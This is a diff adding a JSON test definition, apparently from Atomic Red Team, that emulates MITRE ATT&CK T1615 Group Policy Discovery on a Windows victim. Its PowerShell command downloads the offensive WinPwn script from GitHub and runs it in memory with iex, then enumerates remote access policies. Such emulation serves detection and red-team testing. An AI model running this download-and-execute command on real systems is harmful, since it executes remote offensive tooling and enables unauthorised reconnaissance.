@@ -1,0 +1,23 @@
+{
+    "name": "WinPwn - GPORemoteAccessPolicy",
+    "description": "Enumerate remote access policies through group policy using GPORemoteAccessPolicy function of WinPwn",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nGPORemoteAccessPolicy -consoleoutput -noninteractive",
+        "name": "powershell",
+        "type": "Command Executor"
+    },
+    "id": "T1615",
+    "tactics": [
+        "Discovery"
+    ],
+    "technique": "Group Policy Discovery",
+    "source": "ART",
+    "uuid": "7230d01a-0a72-4bd5-9d7f-c6d472bc6a59",
+    "arguments": null,
+    "preconditions": [],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
